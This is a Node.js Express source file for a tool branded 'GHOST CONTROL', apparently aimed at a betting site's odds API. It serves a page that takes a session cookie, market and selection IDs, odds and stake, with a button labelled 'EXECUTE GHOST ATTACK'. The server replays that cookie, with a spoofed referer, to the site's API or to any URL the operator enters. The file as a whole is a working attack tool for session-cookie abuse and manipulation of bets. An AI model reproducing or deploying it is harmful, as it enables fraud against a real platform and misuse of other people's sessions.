const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { background: #050505; color: #fff; font-family: sans-serif; text-align: center; padding: 10px; }
                .card { max-width: 420px; margin: auto; background: #111; padding: 20px; border: 2px solid #00ffcc; border-radius: 15px; box-shadow: 0 0 20px #00ffcc44; }
                h1 { color: #00ffcc; font-size: 22px; text-shadow: 0 0 10px #00ffcc; margin-bottom: 15px; }
                input { width: 92%; padding: 12px; margin: 6px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 8px; font-size: 13px; }
                .manual-grid { display: flex; gap: 8px; margin: 10px 0; }
                .box { flex: 1; background: #000; padding: 8px; border-radius: 8px; border: 1px solid #00ffcc33; }
                .box label { font-size: 9px; color: #666; display: block; margin-bottom: 4px; text-transform: uppercase; }
                .box input { width: 85%; padding: 4px; font-size: 16px; font-weight: bold; color: #00ffcc; text-align: center; background: transparent; border: none; border-bottom: 1px solid #00ffcc; margin: 0; }
                #btn { width: 100%; padding: 18px; background: #00ffcc; color: #000; font-weight: bold; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; margin-top: 15px; }
                #status { margin-top: 15px; font-weight: bold; color: #ffcc00; font-size: 14px; }
                #timer { font-size: 35px; color: #ff4d4d; font-weight: bold; display: none; }
                .api-input { border-color: #ffcc0066; color: #ffcc00; font-size: 11px; }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>🚀 GHOST CONTROL v11.7</h1>
                
                <input id="c" placeholder="SESSION COOKIE">
                <input id="api" class="api-input" placeholder="MANUAL API URL (OPTIONAL)">
                
                <div class="manual-grid">
                    <input id="m" placeholder="MARKET ID" style="width:48%">
                    <input id="s" placeholder="SELECT ID" style="width:48%">
                </div>

                <div class="manual-grid">
                    <div class="box">
                        <label>ODDS</label>
                        <input id="p" type="number" value="100">
                    </div>
                    <div class="box">
                        <label>STAKE</label>
                        <input id="stk" type="number" value="500">
                    </div>
                </div>

                <div id="status">SYSTEM READY</div>
                <div id="timer">11s</div>

                <button id="btn" onclick="run()">⚡ EXECUTE GHOST ATTACK</button>
            </div>

            <script>
                async function run() {
                    const m = document.getElementById('m').value;
                    const s = document.getElementById('s').value;
                    const c = document.getElementById('c').value;
                    const p = document.getElementById('p').value;
                    const stk = document.getElementById('stk').value;
                    const api = document.getElementById('api').value;
                    
                    if(!m || !s) return alert("Market/Selection ID zaruri hai!");

                    const btn = document.getElementById('btn');
                    btn.disabled = true; btn.style.background = "#222";
                    document.getElementById('status').innerText = "ATTACKING...";
                    document.getElementById('timer').style.display = "block";

                    try {
                        await fetch('/execute', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({m, s, c, p, stk, api})
                        });
                        document.getElementById('status').innerText = "PACKETS SENT!";
                    } catch(e) { document.getElementById('status').innerText = "FAILED!"; }

                    let time = 11;
                    let clock = setInterval(() => {
                        time--; document.getElementById('timer').innerText = time + "s";
                        if(time <= 0) { clearInterval(clock); location.reload(); }
                    }, 1000);
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/execute', async (req, res) => {
    try {
        const { m, s, c, p, stk, api } = req.body;
        // Agar manual API hai toh wo lo, warna default
        let target = api || "https://alidata.wizardnew.com/api/MatchOdds/GetOddslite/4/" + m + "/" + s;
        
        await axios.get(target, {
            headers: { 'cookie': c || '', 'referer': 'https://wizardnew.com/' },
            params: { odds: p, stake: stk },
            timeout: 5000
        });
        res.json({ s: 1 });
    } catch (e) { res.json({ s: 0 }); }
});

app.listen(process.env.PORT || 8080);
